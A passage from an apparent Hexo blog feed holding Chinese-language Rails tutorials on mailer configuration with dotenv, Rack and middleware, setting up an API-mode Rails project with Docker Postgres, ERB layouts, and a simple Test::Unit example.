class="string">&quot;#&#123;Rails.root&#125;/spec/mailers/previews&quot;</span></span><br></pre></td></tr></table></figure></li><li>用 dotenv 创建环境变量，Gemfile<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gem</span> <span class="string">&#x27;dotenv-rails&#x27;</span></span><br></pre></td></tr></table></figure></li><li>config&#x2F;application.rb<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Bundler</span>.</span></span>require(*<span class="module-access"><span class="module"><span class="identifier">Rails</span>.</span></span>groups)</span><br><span class="line">Dotenv::<span class="module-access"><span class="module"><span class="identifier">Railtie</span>.</span></span>load</span><br></pre></td></tr></table></figure></li><li>.env<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">smtp_username</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">smtp_password</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">smtp_domain</span>=<span class="string">&#x27;smtp.qq.com&#x27;</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">smtp_port</span>=<span class="string">&#x27;587&#x27;</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">smtp_authentication</span>=<span class="string">&#x27;plain&#x27;</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">smtp_enable_starttls_auto</span>=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">mailer_sender</span>=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li><li>.env.local（并添加至 .gitignore）<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">smtp_username</span>=<span class="string">&#x27;xxxxx&#x27;</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">smtp_password</span>=<span class="string">&#x27;xxxxxx&#x27;</span></span><br></pre></td></tr></table></figure></li><li>app&#x2F;models&#x2F;user.rb<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class <span class="title class_">User</span> &lt; <span class="title class_">ApplicationRecord</span></span><br><span class="line">  has_secure_password</span><br><span class="line">  validates_presence_of <span class="symbol">:email</span></span><br><span class="line">  validates_uniqueness_of <span class="symbol">:email</span></span><br><span class="line">  validates_presence_of <span class="symbol">:password_confirmation</span>, <span class="symbol">on:</span> [<span class="symbol">:create</span>]</span><br><span class="line"></span><br><span class="line">  validates_format_of <span class="symbol">:email</span>, <span class="symbol">with:</span> /.+@.+/, <span class="symbol">if:</span> <span class="symbol">:email</span></span><br><span class="line">  validates_length_of <span class="symbol">:password</span>, <span class="symbol">minimum:</span> <span class="number">6</span>, <span class="symbol">on:</span> [<span class="symbol">:create</span>], <span class="symbol">if:</span> <span class="symbol">:password</span></span><br><span class="line"></span><br><span class="line">  after_create <span class="symbol">:send_welcome_email</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">send_welcome_email</span></span></span><br><span class="line">    <span class="title class_">UserMailer</span>.welcome_email(self).deliver_now</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Rails </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rails API</title>
      <link href="/Blog/2020/09/10/rails/Rails_API/index/"/>
      <url>/Blog/2020/09/10/rails/Rails_API/index/</url>
      
        <content type="html"><![CDATA[<h2 id="经典-MVC-架构"><a href="#经典-MVC-架构" class="headerlink" title="经典 MVC 架构"></a>经典 MVC 架构</h2><ul><li>路由（router）根据请求路径来选择控制器（Controller）</li><li>控制器选择合适的视图（View），渲染给用户</li><li>如果涉及到数据库，控制器会调用 Modle 拿数据</li><li>Modle 会调用 ORM 来简化数据操作</li><li>ORM 会直接与数据库打交道</li><li>Rails 的 ActiveRecord 是一个超级强大的 ORM</li></ul><h2 id="这么看起来，Rails-很简单？"><a href="#这么看起来，Rails-很简单？" class="headerlink" title="这么看起来，Rails 很简单？"></a>这么看起来，Rails 很简单？</h2><ul><li>上面的架构图隐藏了 Rails 的大部分功能</li><li>简单的东西往往更耐用（Rails 始于 2004 火于 2012）</li><li>但那时的中国开发者居然喜欢上了 PHP</li><li>目前大部分的开发者对 Rails 的印象就是慢，其实这么多年过去了他已经不慢了</li></ul><h2 id="Rails-的依赖-–-Rack"><a href="#Rails-的依赖-–-Rack" class="headerlink" title="Rails 的依赖 – Rack"></a>Rails 的依赖 – Rack</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul><li>提供非常简单的 API</li><li>封装了 HTTP request 和 HTTP response</li><li>提出了中间件模型</li></ul><p><strong>一个简单的例子</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rack&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;webrick&#x27;</span></span><br><span class="line"></span><br><span class="line">class <span class="title class_">RackApp</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">call</span></span>(env)</span><br><span class="line">    [</span><br><span class="line">      <span class="number">200</span>,</span><br><span class="line">      &#123;&#125;,</span><br><span class="line">      [<span class="string">&#x27;&lt;h1&gt;Rack&lt;/h1&gt;&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Rack</span>::<span class="title class_">Handler</span>::<span class="title class_">WEBrick</span>.run <span class="title class_">RackApp</span>.new, <span class="symbol">Host:</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="symbol">Port:</span> <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">// lambda</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rack&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;webrick&#x27;</span></span><br><span class="line"><span class="title class_">Rack</span>::<span class="title class_">Handler</span>::<span class="title class_">WEBrick</span>.run -&gt;(env) &#123;</span><br><span class="line">  [</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    &#123;<span class="string">&quot;Content-Type&quot;</span> =&gt; <span class="string">&quot;text/html;charset=utf-8&quot;</span>&#125;,</span><br><span class="line">    [<span class="string">&quot;&lt;h1&gt;rack_lambda&lt;/h1&gt;&quot;</span>, <span class="string">&quot;&lt;p&gt;第二行内容&lt;/p&gt;&quot;</span>]</span><br><span class="line">  ]</span><br><span class="line">&#125;,  <span class="symbol">Host:</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="symbol">Port:</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><blockquote><p><a href="https://github.com/rack/rack/blob/master/test/spec_request.rb">用法</a>，<a href="https://github.com/rack/rack/blob/master/SPEC.rdoc#the-environment-">env</a></p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rack&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;webrick&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RackApp</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">env</span>)</span><br><span class="line">    request = <span class="title class_">Rack::Request</span>.new(env)</span><br><span class="line">    p <span class="string">&quot;你请求的路径是：<span class="subst">#&#123;request.path&#125;</span>&quot;</span></span><br><span class="line">    [</span><br><span class="line">      <span class="number">200</span>,</span><br><span class="line">      &#123;&#125;,</span><br><span class="line">      [<span class="string">&#x27;&lt;h1&gt;Rack&lt;/h1&gt;&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">  <span class="keyword">end</span> </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Rack</span><span class="symbol">:</span><span class="symbol">:Handler</span><span class="symbol">:</span><span class="symbol">:WEBrick</span>.run <span class="title class_">RackApp</span>.new, <span class="title class_">Host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="title class_">Port</span>: <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure><h2 id="中间件模型"><a href="#中间件模型" class="headerlink" title="中间件模型"></a>中间件模型</h2><blockquote><p>用户请求之后，服务器响应之前，放在</p></blockquote><ul><li>Rack 模仿管道 pipe 实现了自己的中间件模型</li><li>也就是把 req 和 res 依次传给不同类，得到最终结果</li><li>举例<a href="https://github.com/rack/rack/blob/master/lib/rack/common_logger.rb#L3">CommonLogger</a><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rack&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;webrick&#x27;</span></span><br><span class="line">app = <span class="title class_">Rack</span>::<span class="title class_">Builder</span>.app <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">use</span> <span class="title class_">Rack</span>::<span class="title class_">CommonLogger</span></span><br><span class="line">  run -&gt; (env)&#123;</span><br><span class="line">    [<span class="number">200</span>, &#123;&#125;, [<span class="string">&#x27;&lt;h1&gt;CommonLogger&lt;/h1&gt;&#x27;</span>]]</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="title class_">Rack</span>::<span class="title class_">Handler</span>::<span class="title class_">WEBrick</span>.run app,  <span class="symbol">Host:</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="symbol">Port:</span> <span class="number">1234</span>, <span class="symbol">AccessLog:</span> []</span><br></pre></td></tr></table></figure><blockquote><p>先用 AccessLog: [] 禁用默认的 log<br>再使用 use Rack::CommonLogger 来引入中间件</p></blockquote></li></ul><h2 id="对比其他"><a href="#对比其他" class="headerlink" title="对比其他"></a>对比其他</h2><h3 id="发现-Rack-和-Express-很像"><a href="#发现-Rack-和-Express-很像" class="headerlink" title="发现 Rack 和 Express 很像"></a>发现 Rack 和 Express 很像</h3><ul><li>查阅发现，Express 一开始就是受 Rack 启发而写的</li><li><a href="https://github.com/expressjs/express/issues/225">Issue</a></li></ul><h3 id="Rack-和-Rails-的区别"><a href="#Rack-和-Rails-的区别" class="headerlink" title="Rack 和 Rails 的区别"></a>Rack 和 Rails 的区别</h3><ul><li>Rack 只是对请求和响应进行了简单封装</li><li>由于它很简单易学，所以他被各种框架和中间件采用了</li><li>Rails 包涵了你需要的一切功能，也包含了 Rack</li></ul><h2 id="创建-Rails-项目"><a href="#创建-Rails-项目" class="headerlink" title="创建 Rails 项目"></a>创建 Rails 项目</h2><h3 id="首先为了防止-gem-install-很慢"><a href="#首先为了防止-gem-install-很慢" class="headerlink" title="首先为了防止 gem install 很慢"></a>首先为了防止 gem install 很慢</h3><ul><li>gem install 后面添加 –verbose</li><li>编辑 ~&#x2F;.gemrc ，最后一行写入 <code>gem: &quot;--no-document&quot;</code>，因为默认 gem 在下载包的时候会下载文档，而一般这个文档没什么用</li><li>按 <a href="https://gems.ruby-china.com/">Ruby China</a>说的做</li></ul><h5 id="gem-是什么"><a href="#gem-是什么" class="headerlink" title="gem 是什么"></a>gem 是什么</h5><ul><li>类似于 Node.js 里面的 npm</li><li>gem install 用于全局安装依赖</li><li>局部安装依赖可以用 bundle install</li></ul><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul><li>gem install rails –version&#x3D;6.0.2.2</li><li>rails –help 看看选项</li><li><code>rails new morney-rails1 --database=postgresql --skip-action-mailbox --skip-action-text --skip-sprockets --skip-javascript --skip-turbolinks --skip-system-test --skip-test --api --skip-webpack-insall</code>（postgresql 数据库，不要收件箱，不要富文本，不要 sprockets，不要 js，不要turbolinks，不要系统测试，不要测试，使用api模式，api模式是一个比较轻量的模式，不要 webpack）</li><li>在 .gitignore 里添加 .idea</li></ul><h3 id="Hello-Rails"><a href="#Hello-Rails" class="headerlink" title="Hello Rails"></a>Hello Rails</h3><h5 id="在-routes-rb-里写"><a href="#在-routes-rb-里写" class="headerlink" title="在 routes.rb 里写"></a>在 routes.rb 里写</h5><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rails.<span class="built_in">application</span>.routes.draw do</span><br><span class="line">  <span class="keyword">get</span> &#x27;/hello&#x27;, <span class="keyword">to</span>: &#x27;<span class="keyword">first</span><span class="comment">#hello&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h5 id="创建-app-x2F-controllers-x2F-first-controller-rb"><a href="#创建-app-x2F-controllers-x2F-first-controller-rb" class="headerlink" title="创建 app&#x2F;controllers&#x2F;first_controller.rb"></a>创建 app&#x2F;controllers&#x2F;first_controller.rb</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">FirstController</span> &lt; <span class="symbol">ApplicationController</span></span><br><span class="line">  <span class="symbol">def</span> <span class="symbol">hello</span></span><br><span class="line">    <span class="symbol">render</span> <span class="symbol">plain: </span>&#x27;<span class="symbol">hello</span>&#x27;</span><br><span class="line">  <span class="symbol">end</span></span><br><span class="line"><span class="symbol">end</span></span><br></pre></td></tr></table></figure><h5 id="运行命令-bin-rails-serve-（可缩写为s）"><a href="#运行命令-bin-rails-serve-（可缩写为s）" class="headerlink" title="运行命令 bin/rails serve （可缩写为s）"></a>运行命令 <code>bin/rails serve</code> （可缩写为s）</h5><h5 id="发现数据库报错，因为默认-rails-是有数据库的，但是却发现连接不上"><a href="#发现数据库报错，因为默认-rails-是有数据库的，但是却发现连接不上" class="headerlink" title="发现数据库报错，因为默认 rails 是有数据库的，但是却发现连接不上"></a>发现数据库报错，因为默认 rails 是有数据库的，但是却发现连接不上</h5><p><img src="/Blog/2020/09/10/rails/Rails_API/index/img.png"></p><h4 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -v morney-rails1-data:/var/lib/postgresql/data -p 5001:5432 -e <span class="attribute">POSTGRES_USER</span>=morney -e <span class="attribute">POSTGRES_PASSWORD</span>=123456 -d postgres:12.2</span><br></pre></td></tr></table></figure><p>配置数据库：config&#x2F;database.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">default:</span> <span class="meta">&amp;default</span></span><br><span class="line">  <span class="attr">adapter:</span> <span class="string">postgresql</span></span><br><span class="line">  <span class="attr">encoding:</span> <span class="string">unicode</span></span><br><span class="line">  <span class="attr">pool:</span> &lt;%=<span class="language-ruby"> <span class="variable constant_">ENV</span>.fetch(<span class="string">&quot;RAILS_MAX_THREADS&quot;</span>) &#123; <span class="number">5</span> &#125; </span>%&gt;</span><br><span class="line">  <span class="attr">username:</span> <span class="string">morney</span></span><br><span class="line">  <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">localhost</span> <span class="string">//</span> <span class="string">或者</span> <span class="number">192.168</span><span class="number">.99</span><span class="number">.100</span> <span class="string">你的</span> <span class="string">docker</span> <span class="string">ip</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">5001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">development:</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="string">*default</span> </span><br><span class="line">  <span class="attr">database:</span> <span class="string">morney_rails1_development</span></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">morney_rails1_test</span></span><br><span class="line"><span class="attr">production:</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">morney_rails1_production</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">morney_rails1</span></span><br><span class="line">  <span class="attr">password:</span> &lt;%=<span class="language-ruby"> <span class="variable constant_">ENV</span>[<span class="string">&#x27;MORNEY_RAILS_1_DATABASE_PASSWORD&#x27;</span>] </span>%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注意账户密码是安装psql时帐号密码，<br>注意生产环境的密码不能直接写在配置文件中，一般以环境变量的形式</p></blockquote><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/bin/</span>rails db:create</span><br></pre></td></tr></table></figure><blockquote><p>让 rails 根据配置文件自动创建数据库</p></blockquote><p><img src="/Blog/2020/09/10/rails/Rails_API/index/img_1.png" alt="成功运行"></p><h3 id="配置修改文件自动重启"><a href="#配置修改文件自动重启" class="headerlink" title="配置修改文件自动重启"></a>配置修改文件自动重启</h3><h4 id="只有-windows-用户才存在这个问题-新版好像也不会出现这个问题了"><a href="#只有-windows-用户才存在这个问题-新版好像也不会出现这个问题了" class="headerlink" title="只有 windows 用户才存在这个问题(新版好像也不会出现这个问题了)"></a>只有 windows 用户才存在这个问题(新版好像也不会出现这个问题了)</h4><ul><li>打开 config&#x2F;environments&#x2F;development.rb</li><li>将文件末尾的 config.file_watcher 接触注释</li><li>然后在 Gemfile 加上这两句话<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">group <span class="symbol">:development</span> <span class="keyword">do</span></span><br><span class="line">  gem <span class="string">&#x27;listen&#x27;</span></span><br><span class="line">  gem <span class="string">&#x27;wdm&#x27;</span>, <span class="string">&#x27;&gt;= 0.1.0&#x27;</span>, <span class="symbol">platforms:</span> [<span class="symbol">:mingw</span>, <span class="symbol">:mswin</span>, <span class="symbol">:x64_mingw</span>, <span class="symbol">:jruby</span>]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li>安装依赖 <code>bin/bundle install</code></li></ul><h2 id="渲染-JSON"><a href="#渲染-JSON" class="headerlink" title="渲染 JSON"></a>渲染 JSON</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">FirstController</span> &lt; <span class="symbol">ApplicationController</span></span><br><span class="line">  <span class="symbol">def</span> <span class="symbol">hello</span></span><br><span class="line">    <span class="symbol">render</span> <span class="symbol">json: </span>&#123;name: <span class="string">&#x27;zch&#x27;</span>, age: <span class="number">18</span>&#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="渲染-HTML"><a href="#渲染-HTML" class="headerlink" title="渲染 HTML"></a>渲染 HTML</h2><h3 id="如果前后端彻底分离"><a href="#如果前后端彻底分离" class="headerlink" title="如果前后端彻底分离"></a>如果前后端彻底分离</h3><ul><li>那么 Rails 服务器一般是不负责 HTML 的</li><li>我们会让 nginx 来负责 HTML</li></ul><h3 id="如果分离不彻底呢？"><a href="#如果分离不彻底呢？" class="headerlink" title="如果分离不彻底呢？"></a>如果分离不彻底呢？</h3><ul><li>Rails 也是可以用来渲染 HTML 的</li><li>在 application_controller 里加上 <code>include ActionView::Layouts</code></li><li>Rails 就会按照上约定寻找对应的 HTML 模版</li><li>如果需要在 HTML 中插入 ruby，就以 .erb 结尾</li><li><code>&lt;% ___ %&gt;</code> 用于写语句（一般没有值），如：if&#x2F;else<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">&lt;h1&gt;</span>我是一个页面<span class="attribute">&lt;/h1&gt;</span></span><br><span class="line"><span class="attribute">&lt;% a = 3 %&gt;</span></span><br><span class="line"><span class="attribute">&lt;% if a &gt;</span> 5%&gt;</span><br><span class="line">  a 很大</span><br><span class="line"><span class="attribute">&lt;% else %&gt;</span></span><br><span class="line">  a 很小</span><br><span class="line"><span class="attribute">&lt;% end %&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;%= __ %&gt;</code> 用于写表达式（一定有值），如： @xxx<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">&lt;h1&gt;</span>我是一个页面<span class="attribute">&lt;/h1&gt;</span></span><br><span class="line"><span class="attribute">&lt;% a = 3 %&gt;</span></span><br><span class="line"><span class="attribute">&lt;%= a * 2 %&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">FirstController</span> &lt; <span class="symbol">ApplicationController</span></span><br><span class="line">  <span class="symbol">def</span> <span class="symbol">hello</span></span><br><span class="line">    @<span class="symbol">xxx</span> = &#x27;<span class="symbol">Controller</span> 里面的 <span class="symbol">xxx</span> 变量&#x27;</span><br><span class="line">    <span class="symbol">render</span> &#x27;<span class="symbol">first</span>/<span class="symbol">hello</span>&#x27;</span><br><span class="line">  <span class="symbol">end</span></span><br><span class="line"><span class="symbol">end</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="symbol">h1</span>&gt;我是一个页面&lt;/<span class="symbol">h1</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;%= @<span class="symbol">xxx</span> %&gt;</span><br></pre></td></tr></table></figure></li><li>如果让 Nginx 负责 HTML，就不用使用这些标签了</li></ul><h3 id="如何使用-layout"><a href="#如何使用-layout" class="headerlink" title="如何使用 layout"></a>如何使用 layout</h3><h4 id="代码复用"><a href="#代码复用" class="headerlink" title="代码复用"></a>代码复用</h4><ul><li>默认的 layout 是 application.html.erb</li><li>可以使用 &lt;%&#x3D; yield %&gt; 作为插槽</li><li>可以使用 &lt;%&#x3D; yield :footer %&gt; 作为具名插槽<figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%=</span><span class="language-ruby"> <span class="keyword">yield</span> </span><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml">&lt;%</span><span class="language-ruby"> <span class="keyword">if</span> content_for?(<span class="symbol">:footer</span>) </span><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">footer</span> <span class="attr">style</span>=<span class="string">&quot;background-color: #c03&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;%=</span><span class="language-ruby"> <span class="keyword">yield</span> <span class="symbol">:footer</span> </span><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%</span><span class="language-ruby"> <span class="keyword">end</span> </span><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Rails </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>basic code</title>
      <link href="/Blog/2020/09/06/rails/basic_code/index/"/>
      <url>/Blog/2020/09/06/rails/basic_code/index/</url>
      
        <content type="html"><![CDATA[<h2 id="一个简单的测试"><a href="#一个简单的测试" class="headerlink" title="一个简单的测试"></a>一个简单的测试</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gem install test-unit --verbose</span></span><br><span class="line">def to_word(s)</span><br><span class="line">  s.gsub(/\d/, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">require <span class="string">&#x27;test/unit&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="symbol">ToWordTest</span> &lt; <span class="symbol">Test::<span class="symbol">Unit</span>::<span class="symbol">TestCase</span></span></span><br><span class="line">  <span class="symbol">def</span> <span class="symbol">test1</span></span><br><span class="line">    <span class="symbol">assert_equal</span> &#x27;<span class="symbol">hello</span> <span class="symbol">world</span>&#x27;, <span class="symbol">to_word</span>(&#x27;<span class="symbol">234234he345345l345345lo345345</span> <span class="symbol">wo345r4353ld</span>&#x27;)</span><br><span class="line">  <span class="symbol">end</span></span><br><span class="line"><span class="symbol">end</span></span><br></pre></td></tr></table></figure><h4 id="在-class-String-上添加方法"><a href="#在-class-String-上添加方法" class="headerlink" title="在 class String 上添加方法"></a>在 class String 上添加方法</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">String</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">to_word</span></span><br><span class="line">    <span class="variable language_">self</span>.gsub(<span class="regexp">/\d/</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># self 可以省略</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;test/unit&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ToWordTest</span> &lt; <span class="title class_ inherited__">Test::Unit::TestCase</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">test1</span></span><br><span class="line">    assert_equal <span class="string">&#x27;hello world&#x27;</span>, <span class="string">&#x27;234234he345345l345345lo345345 wo345r4353ld&#x27;</span>.to_word</span><br><span class="line">  <span class="keyword">end</span></span><br><span 